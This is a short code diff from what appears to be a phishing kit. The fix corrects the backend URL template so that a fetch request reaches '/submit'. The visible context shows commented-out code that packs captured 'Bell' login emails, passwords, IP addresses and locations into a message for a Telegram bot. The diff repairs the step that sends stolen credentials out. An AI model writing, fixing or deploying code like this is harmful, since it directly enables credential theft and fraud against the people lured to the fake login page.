@@ -100,7 +100,7 @@
     // const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
     // const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const url = `{BACKEND_URL}/submit`;
+    const url = `${BACKEND_URL}/submit`;
 
     try {
       const response = await fetch(url, {
